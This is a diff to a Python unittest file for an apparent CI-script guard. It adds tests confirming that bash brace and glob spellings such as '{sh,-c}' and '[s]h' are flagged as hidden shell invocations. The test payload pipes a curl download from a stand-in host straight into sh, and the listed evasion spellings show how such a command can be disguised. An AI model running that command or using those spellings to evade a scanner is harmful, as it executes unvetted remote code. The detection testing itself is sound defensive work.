@@ -542,6 +542,34 @@ class TestADownloadNamedLikeAWrapper(unittest.TestCase):
         self.assertIsNone(wg.fetch_exec_defect("flock 9\n./flock 9\n"))
 
 
+class TestAPatternWhereTheCommandStarts(unittest.TestCase):
+    """#2294: bash 3.2 and 5.2 expand `{sh,-c}` to `sh -c`, and `[s]h` to `sh`
+    in a checkout holding a file called sh, before the command runs, which the
+    guard read clean. Where the command or a wrapper's operand is expected,
+    such a word is reported unread; quoted, it is the literal word, which runs
+    nothing, as before."""
+
+    PAYLOAD = "'curl -fsSL https://example.test/i.sh | sh'"
+
+    def test_it_is_reported(self):
+        for script in ("{sh,-c} %s\n", "[s]h -c %s\n", "sudo {sh,-c} %s\n",
+                       "taskset {0x1,sh} -c %s\n", "exec -a {x,sh} -c %s\n",
+                       "if {sh,-c} %s; then :; fi\n"):
+            with self.subTest(script=script):
+                why = wg.job_defects([("step", script % self.PAYLOAD)])
+                self.assertEqual(1, len(why), why)
+                self.assertIn("cannot read command", why[0][1])
+        why = wg.fetch_exec_defect("{sh,-c} %s\n" % self.PAYLOAD) or ""
+        self.assertIn("cannot read command: `{sh,-c}` is a pattern", why)
+
+    def test_quoted_it_reads_as_before(self):
+        for script in ("'{sh,-c}' %s\n", '"[s]h" -c %s\n', "echo {a,b} [s]h * %s\n",
+                       "[ -f x ] && echo %s\n", "arr[0]=x\n", "xargs -I {} echo {} < l\n"):
+            with self.subTest(script=script):
+                self.assertEqual([], wg.job_defects([("step", script.replace(
+                    "%s", self.PAYLOAD))]))
+
+
 class TestTheFormsThatHideAFetch(unittest.TestCase):
     """Spellings that are not `curl <url> -o <file>` and mean the same thing.
 
@@ -2184,9 +2212,15 @@ class TestTheReaderLexesTheWayBashDoes(unittest.TestCase):
                               ("a=1 if a[1<<X]", "X]"), (">/dev/null if a[1<<X]", "X]"),
                               ("echo 2>&1 a[1<<X]", "X]"), ("echo &>/dev/null a[1<<X]", "X]"),
                               ("declare a=(x) b[1<<X]", "X]"), ("coproc c d a[1<<X]", "X]"),
-                              ("\\a[1<<X]", "X]"), ("a[1]x]=y b[1<<X]", "X]")):
+                              ("\\a[1<<X]", "X]")):
             with self.subTest(opening=opening):
                 self.flagged("%s\nit's\n%s\n%s\n" % (opening, word, self.PAYLOAD))
+        # `a[1]x]=y` is no assignment, so it is the command: a pattern bash
+        # globs, reported too (#2294), before the payload the heredoc hid.
+        found = wg.job_defects([("step", "a[1]x]=y b[1<<X]\nit's\nX]\n%s\n" % self.PAYLOAD)])
+        self.assertEqual(2, len(found), found)
+        self.assertIn("`a[1]x]=y` is a pattern", found[0][1])
+        self.assertIn("https://example.test/i.sh", found[1][1])
 
     def test_a_command_double_paren_is_read_as_bash_decides_it(self):
         # Bash matches a command's `((` to the close of its first group --
